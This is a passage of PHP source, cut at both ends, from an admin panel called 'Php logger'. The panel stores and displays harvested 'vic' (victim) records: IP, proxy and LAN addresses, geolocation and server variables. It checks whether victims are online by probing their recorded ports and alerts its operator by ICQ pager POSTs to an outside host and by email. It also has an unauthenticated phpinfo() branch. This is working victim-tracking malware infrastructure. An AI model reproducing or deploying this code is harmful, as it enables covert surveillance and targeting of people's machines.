			       <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_pwd\" value=\"$pass\"></td>
		           <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;log encrypter</font></td>
			       <td><select style=\"width:100%; text-align: center\" name=\"_crypter\">");
                   test_select($crypter,1);
echo(" 						
						</select></td>
				   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;encryption key</font></td>
			       <td><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_key_crypt\" value=\"$key_crypt\"></td>
				</tr>
				<tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[2]\">
			      <td align=\"center\" colspan=\"4\">
				     <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[2]\">&nbsp;background conf</font>
			      </td>
				  <td align=\"center\" colspan=\"4\">
				     <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[2]\">&nbsp;police conf</font>
			      </td>
                </tr> 
				<tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>");
#-------------------------------------------------------------------------------------------------------
  for($i=0;$i<count($figure);$i++)
      {
	  if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}
	  
	  echo("<tr bgcolor=\"$exa\">
	           <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">&nbsp;".str_replace("_"," ",$figure[$i])."</td>
			   <td align=\"right\" colspan=\"3\"><select style=\"width:100%\" name=\"_figure_[$i]\">");
			   for($j=0;$j<count($palette_couleur);$j++)
                   {
				   if($palette_couleur[$j]==$figure_[$i])
				      {
					  echo("<option selected style=\"background-color: $palette_couleur[$j]\" value=\"$palette_couleur[$j]\"></option>");
					  }
					  else
					      {
	                      echo("<option style=\"background-color: $palette_couleur[$j]\" value=\"$palette_couleur[$j]\"></option>");
						  }
	               }
	  echo("</select>
	 		   </td>
			   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">&nbsp;".str_replace("_"," ",$figure2[$i])."</td>
			   <td align=\"right\" colspan=\"3\"><select style=\"width:100%\" name=\"_figure2_[$i]\">");
			   for($j=0;$j<count($palette_couleur);$j++)
                   {
				   if($palette_couleur[$j]==$figure2_[$i])
				      {
					  echo("<option selected style=\"background-color: $palette_couleur[$j]\" value=\"$palette_couleur[$j]\"></option>");
					  }
					  else
					      {
	                      echo("<option style=\"background-color: $palette_couleur[$j]\" value=\"$palette_couleur[$j]\"></option>");
						  }
	               }      
	  echo("</select>
	 		   </td>
			</tr>
			");
	  }
#-------------------------------------------------------------------------------------------------------echo("
echo("
            <tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>
			<tr bgcolor=\"$figure_[5]\">
			   <td colspan=\"8\">
			      <input type=\"hidden\" name=\"op\" value=\"5\">
			      <input type=\"hidden\" name=\"pass\" value=\"$pass\">
			      <input type=\"submit\" style=\"width: 100%\" value=\"Change your config\">
			   </td>
			</tr>
			<tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>		
         </form>
		 </table>
");
exit();
}
   exit();
   }      
##########################################################################################################
# modificate form end
##########################################################################################################

##########################################################################################################
# modificate the config file
##########################################################################################################
  if($op==5 &&  encrypt_log($pass,$key_crypt,1)==$pwd)
     {
	$error=0;
   
   $new_config="<?"."\n";
   $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------     
#   vic folder
   $new_config.="$"."vic_folder"."=\"".$_POST['_vic_folder']."\";"."\n";
   $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------  
#                                security config
#-----------------------------------------------------------------------------------------  
#  pass
   $new_config.="#   security config"."\n";
   $new_config.="###########################################################"."\n";
   $new_config.="$"."pwd"."=\"".encrypt_log($_POST['_pwd'],$key_crypt,1)."\";"."\n";
#  if crypt the logs
   $new_config.="$"."crypter"."=\"".$_POST['_crypter']."\";"."\n";
#  key_crypt
   $new_config.="$"."key_crypt"."=\"".$_POST['_key_crypt']."\";"."\n";
   $new_config.="###########################################################"."\n";   
#-----------------------------------------------------------------------------------------  
#                                admin vic list
#-----------------------------------------------------------------------------------------
   $new_config.="#   vic list admin"."\n";
   $new_config.="###########################################################"."\n";   
#  max_vic_list
   $new_config.="#   max vic list"."\n";
   $new_config.="$"."max_vic_list"."=\"".$_POST['_max_vic_list']."\";"."\n";
#-----------------------------------------------------------------------------------------  
#  max_vic_time
   $new_config.="#   max vic time"."\n";
   $new_config.="$"."max_vic_time"."=\"".$_POST['_max_vic_time']."\";"."\n";
#-----------------------------------------------------------------------------------------  
#  delete_duplicate
   $new_config.="#   delete duplicate"."\n";
   $new_config.="$"."delete_duplicate"."=\"".$_POST['_delete_duplicate']."\";"."\n";
#-----------------------------------------------------------------------------------------  
#  delete vic_off_line
   $new_config.="#   delete vic off line"."\n";
   $new_config.="$"."vic_off_line"."=\"".$_POST['_vic_off_line']."\";"."\n";
   $new_config.="###########################################################"."\n";
#----------------------------------------------------------------------------------------- 
#                            icq config
#----------------------------------------------------------------------------------------- 
   $new_config.="#   icq config"."\n";
   $new_config.="###########################################################"."\n"; 
   $new_config.="#   your icq mail"."\n";
  
#  icq mail
   if(verif_email($_POST['_icq_mail']))
      {
	  $new_config.="$"."icq_mail"."=\"".$_POST['_icq_mail']."\";"."\n";
	  }
	  else
	      {
		  $new_config.="$"."icq_mail"."=\"vic@vic-land.com\";"."\n";
		  }
#----------------------------------------------------------------------------------------- 
#  replace ip delimeter
   $new_config.="#   icq replace ip delimiter"."\n";
   $new_config.="$"."replace"."=\"".$_POST['_replace']."\";"."\n";
#-----------------------------------------------------------------------------------------
#  array replace ip delimeter
   $new_config.="#   array replace ip delimeter"."\n";
   $new_config.="$"."array_replace"."=array(";
	  for($i=0;$i<count($array_replace);$i++)
       {
	   $set_new_config4.=$i."=>"."\"".trim($array_replace[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config4),0,-1);
		  $new_config.=");"."\n"; 
#-----------------------------------------------------------------------------------------
$parse_icq=parse_url($_POST['_icq_send_url']);
   $new_config.="#   icq url to send data host"."\n";
   $new_config.="$"."icq_host"."=\"".$parse_icq['host']."\";"."\n";
   $new_config.="#   icq url to send data path"."\n";
   $new_config.="$"."icq_path"."=\"".$parse_icq['path']."\";"."\n";
   $new_config.="#   icq url referer sender data "."\n";
   $new_config.="$"."icq_referer_url"."=\"".$_POST['_icq_referer_url']."\";"."\n";
#-----------------------------------------------------------------------------------------
#  icq 
$_icq=list_posted_array($_POST['_icq']);

$j=0;

   for($i=0;$i<count($_icq);$i++)
       {
	   if(is_numeric($_icq[$i]) && strlen(trim($_icq[$i]))==9)

		   $set_new_config1.=$j."=>"."\"".$_icq[$i]."\"".",";
		   $new_icq[$j]=$_icq[$i];
		   $j++;
	   }
       $new_config.="#   icq uin to notify"."\n";
	   $new_config.="$"."icq"."=array(";
	   if(!empty($new_icq[0]))
	      {
		  $new_config.=substr(trim($set_new_config1),0,-1);
		  }
	   $new_config.=");"."\n";
	   $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------
#                               mail config    
#-----------------------------------------------------------------------------------------
   $new_config.="#   mail notif config"."\n";
   $new_config.="###########################################################"."\n"; 
   $new_config.="#   mail notif subject"."\n";

#  vic mail subject
   $new_config.="$"."vic_mail_subject"."=\"".$_POST['_vic_mail_subject']."\";"."\n";
#----------------------------------------------------------------------------------------- 
#  email
$_mail=list_posted_array($_POST['_email']);

$j=0;
   for($i=0;$i<count($_mail);$i++)
       {
	   if(verif_email($_mail[$i]))
	      {
		  $set_new_config0.=$j."=>"."\"".$_mail[$i]."\"".",";
		  $new_mail[$j]=$_mail[$i];
	      $j++;
		  }
	   } 
	   $new_config.="#   mail adresses to notify"."\n";
	   $new_config.="$"."email"."=array(";
	   if(!empty($new_mail[0]));
	      {
          $new_config.=substr(trim($set_new_config0),0,-1);
		  }
       $new_config.=");"."\n";
       $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------  
#                                array config
#-----------------------------------------------------------------------------------------
   $new_config.="#   miscellanous config"."\n";
   $new_config.="###########################################################"."\n";
   
   $_post_figure_=list_posted_array($_POST['_figure_']);
   
   $new_config.="$"."figure_"."=array(";
	  for($i=0;$i<count($_post_figure_);$i++)
       {
	   $set_new_config2.=$i."=>"."\"".trim($_post_figure_[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config2),0,-1);
		  $new_config.=");"."\n"; 
#-----------------------------------------------------------------------------------------  
   $_post_figure2_=list_posted_array($_POST['_figure2_']);
   
   $new_config.="$"."figure2_"."=array(";
   
	  for($i=0;$i<count($_post_figure2_);$i++)
       {
	   $set_new_config3.=$i."=>"."\"".trim($_post_figure2_[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config3),0,-1);
		  $new_config.=");"."\n"; 
		  $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------
   $new_config.="$"."figure"."=array(";
	  for($i=0;$i<count($figure);$i++)
       {
	   $set_new_config5.=$i."=>"."\"".trim($figure[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config5),0,-1);
		  $new_config.=");"."\n"; 
		  $new_config.="###########################################################"."\n";
#----------------------------------------------------------------------------------------- 
   $new_config.="$"."figure2"."=array(";
	  for($i=0;$i<count($figure2);$i++)
       {
	   $set_new_config6.=$i."=>"."\"".trim($figure2[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config6),0,-1);
		  $new_config.=");"."\n"; 
		  $new_config.="###########################################################"."\n";
#----------------------------------------------------------------------------------------- 
   $new_config.="$"."palette_couleur"."=array(";
	  for($i=0;$i<count($palette_couleur);$i++)
       {
	   $set_new_config7.=$i."=>"."\"".trim($palette_couleur[$i])."\"".",";
	   }
	  
		  $new_config.=substr(trim($set_new_config7),0,-1);
		  $new_config.=");"."\n"; 
		  $new_config.="###########################################################"."\n";
#-----------------------------------------------------------------------------------------   
   $new_config.="\n"."?>";
	  
   if($fp=fopen("./config.inc.php","w+"))
      {
	  fwrite($fp,$new_config);
      fclose($fp);
	  }else
	       {
		   echo("<li>couldn't create open file ==> aborting changes");
		   sleep(5);
		   $error++;
		   @redirect($PHP_SELF."?op=1&pass=$pass");
		   }
#  end config file modif
#-----------------------------------------------------------------------------------------  
  	 @redirect($PHP_SELF."?op=1&pass=$pass");
	 }
##########################################################################################################
# Advanced vic datas
##########################################################################################################
IF(($op==3 || $op==7) && encrypt_log($pass,$key_crypt,1)==$pwd)
   {
   if(is_file("./".$vic_folder."/".$link))
      {
	  $crypted=0;
	  
	  $net_vic_adress="";
	  $proxy_adress="";
	  $lan_vic_adress="";
	  $name="";$city="";
	  $state="";
	  $country="";
	  $domain_guess="";
	  $translation_vic_ip="";
	  
	  include("./".$vic_folder."/".$link);
	  
  print "<HTML>
	  <HEAD>
            <style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; }  --></style>
	  </HEAD>
          <BODY BGCOLOR=\"$figure_[0]\" top margin=\"$top_margin\"  left_margin=\"$left_margin\">
		 <form>
		    <table cellpadding=\"1\" cellspacing=\"1\" border=\"0\" width=\"100%\" height=\"100%\">
			   <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
			   <tr bgcolor=\"$figure_[1]\">
			      <td width=\"100%\" Colspan=\"2\" height=\"50\">
				     <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[0]\">Php logger [advanced vic data]</font>
			      </td>
			   </tr>
			  <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>";
			   $is_crypted=is_crypted2($crypted);
			   
                $array_vic_var=array(0=>
				$net_vic_adress,$proxy_adress,$lan_vic_adress,$name,$city,$state,$country,$domain_guess,$translation_vic_ip);   
                $array_vic_var_name=array(0=>"Internet adress","Proxy_adress","Lan adress","Internet name","City","State","Country","Domain guess","Ip look up");  
	
				$date=date("d-m-Y H:i",substr(trim(basename($link)),0,-4));
				
				if($op==7)
				   {
				   $port_to_scan=search_port($vic_var_name,$vic_var,$key_crypt,$crypted);

				   echo("
				   <tr bgcolor=\"$figure_[3]\">
			          <td align=\"left\"><font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[3]\"><b>Vic status</b></font></td>
					  <td align=\"left\"><font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[3]\"><b>");
					  
					  if(ping_host2($ip,$port_to_scan))
					     {
						  echo("Vic on line &nbsp; [$ip:$port_to_scan]");
						 }
						 else
						     {
							  echo("Vic off line &nbsp; [$ip:$port_to_scan]");
							 }
				   echo("</b></font></td></tr>");
				   }

					 echo("
					         <tr bgcolor=\"$figure_[4]\">
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[4]\">Date</font></td>
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[4]\">$date</font></td>
							 </tr>
							 <tr bgcolor=\"$figure_[3]\">
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">Encrypted</font></td>
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">");
								is_crypted($crypted);
					 echo("			</font></td>
							 </tr>");
							 				
                for($i=0;$i<count($array_vic_var);$i++)
					{  
					 	   if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}
												 
					if(!empty($array_vic_var[$i]))
					   {
					   echo("
					         <tr bgcolor=\"$exa\">
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".$array_vic_var_name[$i]." </font></td>
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".format(decrypt_log($array_vic_var[$i],$key_crypt,$crypted))."</font></td>
							 </tr>");
					   }
					}
					
					 echo("<tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
                            <tr bgcolor=\"$figure_[1]\">
					          <td colspan=\"2\" height=\"30\">
							     <font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[0]\">Server datas</font></td></tr>
							<tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>");	
					 				
                for($i=0;$i<count($vic_var_name);$i++)
				    {
					 	   if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}
					
				   echo("
					         <tr bgcolor=\"$exa\">
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".$vic_var_name[$i]." </font></td>
					            <td align=\"left\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".format(decrypt_log($vic_var[$i],$key_crypt,$crypted))."</font></td>
							 </tr>");					
					}
					 echo("
					         <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
							 </tr>
							 <tr bgcolor=\"$figure_[5]\">
					            <td align=\"center\" colspan=\"2\">
								<input type=\"submit\" value=\"windows close\" style=\"width:100%\" OnClick=\"parent.close()\">
								</td>
							 </tr>
			                 <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
							 </table></form></body></html>");			
		exit();			
      } 
	  exit();    
   }
##########################################################################################################
IF($op==9)
   {
   echo(phpinfo());
   exit();
   }
##########################################################################################################
#                                     																	 #
#  									 Php logger functions           									 #
#                                     																	 #
##########################################################################################################
function get_query_string($query){
if($query=="GET")
   {
   $array_var=$_GET;     
   }
   else
       {
	   $array_var=$_POST; 
	   }
return $array_var;
}
###############################################################
function format($string){
$result=strip_tags(ucfirst(strtolower($string)));
return $result;
} 
###############################################################
function verif_vic_dir($folder){
$i=0;
    if ($dir = @opendir("."))
        {
         while($file = @readdir($dir))
               {
                if ($file !="." && $file != "..")
                    {     
				     if ($file==$folder){$i++;}
                    }
               }
        if($i==0){mkdir("./".$folder,0755);}
		
		@closedir($dir);
       }
}
###############################################################
function formatt($name,$mail,$replace){

$return=format($name." : ".str_replace(".",$replace,$mail));
return $return;
}
###############################################################
function verif_ip($in) {
      
      if (@ereg('^(127\.)', $in, $part)) {
	return TRUE;
      }
      if (@ereg('^(10\.)', $in, $part)) {
	return TRUE;
      }
      if (@ereg('^(192\.168\.)', $in, $part)) {
      return TRUE;
      }
      if (@ereg('^(172\.)' . '([0-9]{1,3})', $in, $part)) {
	  if(($part[2] > 15) and ($part[2] < 32)) {
	       return TRUE;
	  }
      }
   return FALSE;
}
###############################################################
function verif_email($mail){ 

      if (empty($mail)) {return FALSE;}
      elseif (strlen($mail) < 6){return FALSE;}
      elseif (strlen($mail) > 255) {return FALSE;}
      elseif (!ereg("@", $mail)){return FALSE;}
      elseif (preg_match_all("/([^a-zA-Z0-9_\@\.\-])/i", $mail, $trouve)){return FALSE;}
      elseif (!preg_match("/^([a-z0-9_]|\\-|\\.)+@(([a-z0-9_]|\\-)+\\.)+[a-z]{2,4}\$/i", $mail)){return FALSE;}
	  else{return TRUE;}
}
###############################################################
function verif_result($data,$array_verif){

$country = array("ad" => "Andorre", 
 "ae" => "Emirats arabes unis", 
 "af" => "Afghanistan", 
 "ag" => "Antigua-et-Barbuda", 
 "ai" => "Anguilla", 
 "al" => "Albanie", 
 "am" => "Arménie", 
 "an" => "Antilles", 
 "ao" => "Angola", 
 "aq" => "Antarctique", 
 "ar" => "Argentine", 
 "as" => "Samoa Américaines", 
 "at" => "Autriche", 
 "au" => "Australie", 
 "aw" => "Aruba", 
 "az" => "Azerbaïdjan", 
 "ba" => "Bosnie-Herzégovine", 
 "bb" => "Barbade", 
 "bd" => "Bangladesh", 
 "be" => "Belgique", 
 "bf" => "Bulgarie", 
 "bh" => "Bahreïn", 
 "bi" => "Burundi", 
 "bj" => "Bénin ", 
 "bm" => "Bermudes", 
 "bn" => "Brunei Darussalam", 
 "bo" => "Bolivie", 
 "br" => "Brésil", 
 "bs" => "Bahamas", 
 "bt" => "Bhoutan", 
 "bw" => "Botswana", 
 "by" => "Biélorussie", 
 "bz" => "Belize", 
 "ca" => "Canada", 
 "cc" => "Iles cocos", 
 "cd" => "Congo", 
 "cf" => "République Centrafricaine", 
 "cg" => "Congo", 
 "ch" => "Suisse", 
 "ci" => "Côte d'Ivoire", 
 "ck" => "Iles Cook", 
 "cl" => "Chili", 
 "cm" => "Cameroun", 
 "cn" => "Chine", 
 "co" => "Colombie", 
 "cr" => "Costa Rica", 
 "cs" => "Tchécoslovaquie", 
 "cu" => "Cuba", 
 "cv" => "Cap-Vert", 
 "cx" => "Ile Christmas", 
 "cy" => "Chypre", 
 "cz" => "République Tchèque", 
 "de" => "Allemagne", 
 "dj" => "Djibouti", 
 "dk" => "Danemark", 
 "dm" => "Dominique", 
 "do" => "République Dominicaine", 
 "dz" => "Algérie", 
 "ec" => "Equateur", 
 "ee" => "Estonie", 
 "eg" => "Egypte", 
 "eh" => "Sahara occidental", 
 "er" => "Erythrée", 
 "es" => "Espagne", 
 "et" => "Ethiopie", 
 "fi" => "Finlande", 
 "fj" => "Fidji", 
 "fk" => "Iles Falklands", 
 "fm" => "Micronésie", 
 "fo" => "Ile Feroe", 
 "fr" => "France", 
 "fx" => "France", 
 "ga" => "Gabon", 
 "gd" => "Grenade", 
 "ge" => "Géorgie", 
 "gf" => "Guyane Française", 
 "gh" => "Ghana", 
 "gi" => "Gibraltar", 
 "gl" => "Groënland", 
 "gm" => "Gambie", 
 "gn" => "Guinée", 
 "gp" => "Guadeloupe", 
 "gr" => "Grèce", 
 "gt" => "Guatemala", 
 "gu" => "Guam", 
 "gw" => "Guinée-Bissao", 
 "gy" => "Guyane", 
 "hk" => "Hong Kong", 
 "hn" => "Honduras", 
 "hr" => "Croatie", 
 "ht" => "Haïti", 
 "hu" => "Hongrie", 
 "id" => "Indonésie", 
 "ie" => "Irlande", 
 "il" => "Israël", 
 "in" => "Inde", 
 "iq" => "Iraq", 
 "ir" => "Iran", 
 "is" => "Islande", 
 "it" => "Italie", 
 "jm" => "Jamaïque", 
 "jo" => "Jordanie", 
 "jp" => "Japon", 
 "ke" => "Kenya", 
 "kg" => "Kirghistan", 
 "kh" => "Burkina Faso", 
 "ki" => "Kiribati", 
 "km" => "République comorienne", 
 "kn" => "Saint-Christophe-et-Niévès", 
 "kp" => "Corée du Nord", 
 "kr" => "Corée du Sud", 
 "kw" => "Koweït", 
 "ky" => "Iles Caïmans", 
 "kz" => "Kazakhstan", 
 "la" => "Laos", 
 "lb" => "Liban", 
 "lc" => "Sainte-Lucie", 
 "li" => "Liechtenstein", 
 "lk" => "Sri Lanka", 
 "lr" => "Libéria", 
 "ls" => "Lesotho", 
 "lt" => "Lituanie", 
 "lu" => "Luxembourg", 
 "lv" => "Lettonie", 
 "ly" => "Libye", 
 "ma" => "Maroc", 
 "mc" => "Monaco", 
 "md" => "Moldavie", 
 "mg" => "Madagascar", 
 "mh" => "Marshall", 
 "mk" => "Macédoine", 
 "mn" => "Mongolie", 
 "mo" => "Makau", 
 "mp" => "Ile Mariana du nord", 
 "mr" => "Mauritanie", 
 "ms" => "Monteserrat", 
 "mu" => "Maurice", 
 "mv" => "Maldives", 
 "mw" => "Malawi", 
 "mx" => "Mexique West", 
 "my" => "Malaisie", 
 "mz" => "Mozambique", 
 "na" => "Namibie", 
 "nc" => "Nouvelle-Calédonie", 
 "ne" => "Niger", 
 "nf" => "Ile de Norfolk", 
 "ng" => "Nigeria", 
 "ni" => "Nicaragua", 
 "nl" => "Pays-Bas", 
 "no" => "Norvège", 
 "np" => "Népal", 
 "nr" => "Nauru", 
 "nu" => "Niue", 
 "nz" => "Nouvelle-Zélande", 
 "om" => "Oman", 
 "pa" => "Panama", 
 "pe" => "Pérou", 
 "pf" => "Polynésie Française", 
 "pg" => "Papouasie - Nouvelle Guinée", 
 "ph" => "Philippines", 
 "pk" => "Pakistan", 
 "pl" => "Pologne", 
 "pm" => "St. Pierre and Miquelon", 
 "pn" => "Pitcairn", 
 "pr" => "Porto Rico", 
 "ps" => "Palestine", 
 "pt" => "Portugal", 
 "pw" => "Palau", 
 "py" => "Paraguay", 
 "qa" => "Qatar", 
 "qp" => "Guinée équatoriale", 
 "re" => "Réunion", 
 "ro" => "Roumanie", 
 "ru" => "Fédération russe", 
 "rw" => "Rwanda", 
 "sa" => "Arabie saoudite", 
 "sb" => "Iles Salomon", 
 "sc" => "Seychelles", 
 "sd" => "Soudan", 
 "se" => "Suède", 
 "sg" => "Singapour", 
 "sh" => "Saint Hélène", 
 "si" => "Slovénie", 
 "sk" => "Slovaquie", 
 "sl" => "Sierra Leone", 
 "sm" => "Saint-Marin", 
 "sn" => "Sénégal", 
 "so" => "Somalie", 
 "sr" => "Suriname", 
 "st" => "Sao Tomé-et-Principe", 
 "su" => "Union Soviétique", 
 "sv" => "Salvador", 
 "sy" => "Syrie", 
 "sz" => "Swaziland", 
 "tc" => "Turks et caicos", 
 "td" => "République du Tchad", 
 "tg" => "Togo", 
 "th" => "Thaïlande", 
 "tj" => "Tchétchénie", 
 "tk" => "Iles Tokelau", 
 "tm" => "Turkménistan", 
 "tn" => "Tunisie", 
 "to" => "Tonga", 
 "tp" => "Timor-oriental", 
 "tr" => "Turquie", 
 "tt" => "Trinité-et-Tobago", 
 "tv" => "Tuvalu", 
 "tw" => "Taiwan", 
 "tz" => "Tanzanie", 
 "ua" => "Ukraine", 
 "ug" => "Ouganda", 
 "uk" => "Royaume-Uni", 
 "us" => "Etats Unis d'Amérique", 
 "uy" => "Uruguay", 
 "uz" => "Ousbékistan", 
 "va" => "Vatican", 
 "vc" => "Saint-Vincent-et-les Grenadines", 
 "ve" => "Vénézuela", 
 "vg" => "Iles vierges américaines", 
 "vi" => "Iles vierges britanniques ", 
 "vn" => "Viêt-Nam", 
 "vu" => "Vanuatu", 
 "wf" => "Wallis et Futuna", 
 "ws" => "Samoa occidentales", 
 "ye" => "Yémen", 
 "yt" => "Mayotte", 
 "yu" => "Yougoslavie", 
 "za" => "Afrique du Sud", 
 "zm" => "Zambie", 
 "zr" => "Zaïre", 
 "zw" => "Zimbabwe"); 
###############################################################
for($i=0;$i<=count($array_verif);$i++)
    {
	if(!empty($array_verif[$i]))
	   {
	   if(@stristr($data,$array_verif[$i]))
	      {
		  $fr=trim(strip_tags(substr(strrchr($data,":"),1)));
		  if(@eregi("[A-Z]",$fr))
	         {
			 if($i==3)
			    {
				unset($fr2);
				for($s=0;$s <= count(strlen($fr));$s++){if(@eregi("[A-Z]",$fr[$s])){$fr2.=$fr[$s];}
				}
				$fr2=strtolower($fr2);
				
				$verif="$".strtolower(substr(trim($array_verif[$i]),0,-1))."=\"".ucwords(strtolower($country[$fr2]))."\";"."\n";
				}ELSE{
				     $verif="$".strtolower(substr(trim($array_verif[$i]),0,-1))."=\"".ucwords(strtolower($fr))."\";"."\n";
					 }
		     }
	      }
	   }
	}
return $verif;
} 
######################################################################################
function scan_dir($path){
$i=0;
$result="";

    if($dir=@opendir($path))
	   {
	    while($file=@readdir($dir))
              {
			  if($file[strlen($file)-1]!=".")
                  {
                  if(is_file($path."/".$file))
				      {
					  $result[$i]=$file;
					  $i++;
					  }  
				  }
              }
	   }
	   
	   return $result;
}
######################################################################################
function delete_duplicate($path,$key_crypt){
$i=0;
$result="";

    if($dir=@opendir($path))
	   {
	    while($file=@readdir($dir))
              {
			  if($file[strlen($file)-1]!=".")
                  {
                  if(is_file($path."/".$file))
				      {
					  include($path."/".$file);
					  $vic_ip[$i]=$net_vic_adress;
					  $result[$i]=$path."/".$file;
					  $i++;
					  }  
				  }
              }
	   }
	   if(is_array($result))
	      {
		  array_multisort($result,SORT_DESC,SORT_STRING,$vic_ip);
		  for($i=0;$i<count($result);$i++)
              {
	          for($j=($i+1);$j<count($result);$j++)
	              {
		          if($vic_ip[$i]==$vic_ip[$j] || $vic_ip[$i]==decrypt_log($vic_ip[$j],$key_crypt,1) || $vic_ip[$i]==encrypt_log($vic_ip[$j],$key_crypt,1))
		             {
					 if(is_file($result[$j]))
					    {
						unlink($result[$j]);
						}
		             }
		          }
	          }
		  }
}
######################################################################################
function delete_off_line($path,$key_crypt){
$i=0;
    if($dir=@opendir($path))
	   {
	    while($file=@readdir($dir))
              {
			  if($file[strlen($file)-1]!=".")
                  {
                  if(is_file($path."/".$file))
				      {
					  $crypted="0";
					  unset($vic_var_name);
					  unset($vic_var);
					  
					  include($path."/".$file);
					  
                      $ip[$i]=decrypt_log($net_vic_adress,$key_crypt,$crypted);
					  $port[$i]=search_port($vic_var_name,$vic_var,$key_crypt,$crypted);

                         if(!ping_host2($ip[$i],$port[$i]))
						    {
							if(is_file("./".$path."/".$file))
							   {
							   unlink("./".$path."/".$file);
							   }
							}
						 }
			         }   
              }
	   }
}
######################################################################################
function delete_file($path)
                        {
				        if ($dir2 = @opendir($path))
	                        {
		                    while($file = @readdir($dir2))
		                          { 
			                      if ($file !="." && $file != "..")
                                      {
                                      if (is_file($path."/".$file))        //ouvre les dossiers courants
                                          {
							              @unlink($path."/".$file);
						                  }
					                   }
				                   } 
				              }@closedir($dir2);	
						}
######################################################################################
function select_menu($needle,$init,$limit,$var_name,$size){

print("<select name=\"$var_name\" style=\"width: $size; text-align: center\">");

for($i=$init;$i<=$limit;$i++)
    {
	if($i==$needle)
	   {
	   echo("<option selected value=\"$i\" style=\"text-align: center\">".add_zero($i)."</option>");	   
	   }
	   else
	       {
		   echo("<option value=\"$i\" style=\"text-align: center\">".add_zero($i)."</option>");	
		   }
	}
print("</select>");
}
######################################################################################
class socksender
{
	var $User_Agent="Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)";
	var $Accept_Encoding="gzip,deflate";
	var $method="POST";
	var $protocol="HTTP/1.0";
	var $send2port=80;

	function send($host,$send2url,$referer,$data)
	{
	$http_query="";
		while (list($name,$value)=each($data))
		{
		 $tmp_data[]=urlencode($name)."=".urlencode($value);
		}
		$enc_data=implode("&",$tmp_data);
		$len_data=strlen($enc_data);
	if ($this->method=="POST")
		{
		$http_query=
			$this->method." ".$send2url." HTTP/1.0\r\n".
			"Referer: ".$referer."\r\n".
			"Content-Type: application/x-www-form-urlencoded"."\r\n".
			"Content-Length: ".$len_data."\r\n".
			"Host: ".$host."\r\n".
			"Accept: */*\r\n".
			"Accept-Encoding: ".$this->Accept_Encoding."\r\n".
			"Connection: Keep-Alive"."\r\n".
			"User-Agent: ".$this->User_Agent."\r\n"."\r\n".
			$enc_data;
		 flush();
		   if($fs = fsockopen($host,$this->send2port,&$errno,&$errstr,30))
		      {
			  fputs ($fs,$http_query);
		      while($r=fgets($fs,20048))$rt.=$r;
		      fclose($fs);
		 flush();
			  }else
			       {
				   send_redir_icq($host,$send2url,$data);
				   }
		}
	return $rt;
	}
}
######################################################################################
function send_redir_icq($host,$path,$datas){

reset($datas); 

 while(list($key,$val)=each($datas))
       {
	   $string.=$key."=".$val."&";  
	   }
$url="http://".trim($host).trim($path)."?".substr($string,0,-1);
redirect($url);
}
######################################################################################
function today(){

   $today["d"]=date("d");
   $today["m"]=date("m");
   $today["y"]=date("Y");
   $today["h"]=date("H");
   $today["i"]=date("i");
   
   return $today;
}
######################################################################################
function search_port($array_name,$array_val,$key_crypt,$crypter){
$j=0;
for($i=0;$i<count($array_name);$i++)
    {
	if($crypter==1)
	   {
	   	if(stristr($array_name[$i],"port"))
	       {
	        $port=(decrypt_log($array_val[$i],$key_crypt,$crypter));
	        $j++;
	        }
	   }
